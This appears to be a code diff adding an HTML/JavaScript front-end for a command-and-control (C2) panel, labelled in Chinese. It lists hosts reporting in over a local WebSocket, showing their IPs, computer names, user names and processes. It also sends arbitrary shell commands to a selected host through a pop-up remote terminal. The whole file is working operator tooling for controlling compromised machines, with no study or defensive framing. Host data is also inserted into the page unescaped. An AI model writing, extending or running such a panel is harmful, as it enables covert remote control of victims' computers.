@@ -1,0 +1,161 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>C2 控制面板</title>
+    <style>
+        body { font-family: Arial, sans-serif; background: #1e1e2f; color: #fff; margin: 0; padding: 0; }
+        header { padding: 20px; background: #28293d; text-align: center; font-size: 1.5em; }
+        table { width: 100%; border-collapse: collapse; margin-top: 10px; }
+        th, td { padding: 10px; text-align: left; border-bottom: 1px solid #444; }
+        th { background: #34354a; }
+        tr:hover { background: #2a2b3d; }
+        button { padding: 6px 12px; border: none; background: #4cafef; color: white; cursor: pointer; border-radius: 4px; }
+        button:hover { background: #3a9ad9; }
+        #terminalOverlay {
+            position: fixed; bottom: 20px; right: 20px; width: 500px; height: 300px;
+            background: rgba(0,0,0,0.95); display: none; flex-direction: column; border: 1px solid #555; border-radius: 8px;
+            box-shadow: 0 0 10px rgba(0,0,0,0.5);
+        }
+        #terminalHeader { padding: 8px 10px; background: #111; display: flex; justify-content: space-between; align-items: center; font-size: 0.9em; }
+        #terminalOutput { flex: 1; padding: 10px; background: black; color: #0f0; font-family: monospace; overflow-y: auto; font-size: 0.85em; }
+        #terminalInput { display: flex; }
+        #terminalInput input { flex: 1; padding: 6px; font-family: monospace; border: none; outline: none; font-size: 0.85em; }
+        #terminalInput button { background: #4cafef; border: none; color: white; padding: 6px 10px; cursor: pointer; font-size: 0.85em; }
+    </style>
+</head>
+<body>
+<header>C2 控制面板</header>
+<div style="padding: 20px;">
+    <table id="hostTable">
+        <thead>
+        <tr>
+            <th>ClientID</th>
+            <th>PID</th>
+            <th>Flag</th>
+            <th>内网IP</th>
+            <th>公网IP</th>
+            <th>计算机名</th>
+            <th>用户名</th>
+            <th>进程名</th>
+            <th>最后活动</th>
+            <th>操作</th>
+        </tr>
+        </thead>
+        <tbody></tbody>
+    </table>
+</div>
+<div id="terminalOverlay">
+    <div id="terminalHeader">
+        <span>远程终端</span>
+        <button onclick="closeTerminal()">关闭</button>
+    </div>
+    <div id="terminalOutput"></div>
+    <div id="terminalInput">
+        <input type="text" id="cmdInput" placeholder="输入命令..." />
+        <button onclick="sendTerminalCommand()">发送</button>
+    </div>
+</div>
+<script>
+    const WS_URL = "ws://127.0.0.1:8088/ws";
+    let ws;
+    let currentClientId = null;
+
+    function connect() {
+        ws = new WebSocket(WS_URL);
+        ws.onopen = () => {
+            console.log("WebSocket 已连接");
+            sendGetClients();
+            setInterval(sendGetClients, 5000);
+        };
+        ws.onmessage = (event) => {
+            try {
+                const msg = JSON.parse(event.data);
+                if (msg.type === 1 && msg.content) {
+                    let hosts = [];
+                    try {
+                        hosts = JSON.parse(msg.content);
+                    } catch (e) {
+                        console.error("解析 content 出错", e);
+                    }
+                    updateTable(hosts);
+                } else if (msg.type === 30) {
+                    appendTerminalOutput(msg.content || "");
+                }
+            } catch (err) {
+                console.error("消息解析失败", err);
+            }
+        };
+        ws.onclose = () => {
+            console.log("WebSocket 已断开，5秒后重连...");
+            setTimeout(connect, 5000);
+        };
+    }
+
+    function sendGetClients() {
+        const message = { type: 1, timestamp: Date.now() };
+        ws.send(JSON.stringify(message));
+    }
+
+    function updateTable(hosts) {
+        const tbody = document.querySelector("#hostTable tbody");
+        tbody.innerHTML = "";
+        hosts.forEach(host => {
+            const tr = document.createElement("tr");
+            tr.innerHTML = `
+            <td>${host.ClientID}</td>
+            <td>${host.PID}</td>
+            <td>${host.Flag}</td>
+            <td>${host.InternalIP}</td>
+            <td>${host.IpAddress}</td>
+            <td>${host.ComputerName}</td>
+            <td>${host.UserName}</td>
+            <td>${host.ProcessName}</td>
+            <td>${formatTime(host.last_active)}</td>
+            <td><button onclick="openTerminal('${host.ClientID}')">命令执行</button></td>
+        `;
+            tbody.appendChild(tr);
+        });
+    }
+
+    function openTerminal(clientId) {
+        currentClientId = parseInt(clientId);
+        document.getElementById("terminalOutput").innerHTML = "";
+        document.getElementById("terminalOverlay").style.display = "flex";
+    }
+
+    function closeTerminal() {
+        currentClientId = null;
+        document.getElementById("terminalOverlay").style.display = "none";
+    }
+
+    function sendTerminalCommand() {
+        const cmdInput = document.getElementById("cmdInput");
+        const cmd = cmdInput.value.trim();
+        if (!cmd || !currentClientId) return;
+        const req = {
+            type: 99,
+            timestamp: Date.now(),
+            content: JSON.stringify({ client_id: currentClientId, type: 0, content: cmd })
+        };
+        ws.send(JSON.stringify(req));
+        cmdInput.value = "";
+    }
+
+    function appendTerminalOutput(text) {
+        const output = document.getElementById("terminalOutput");
+        output.innerText += text + "\n";
+        output.scrollTop = output.scrollHeight;
+    }
+
+    function formatTime(timeStr) {
+        const date = new Date(timeStr);
+        if (isNaN(date.getTime())) return timeStr;
+        return date.toLocaleString();
+    }
+
+    connect();
+</script>
+</body>
+</html>
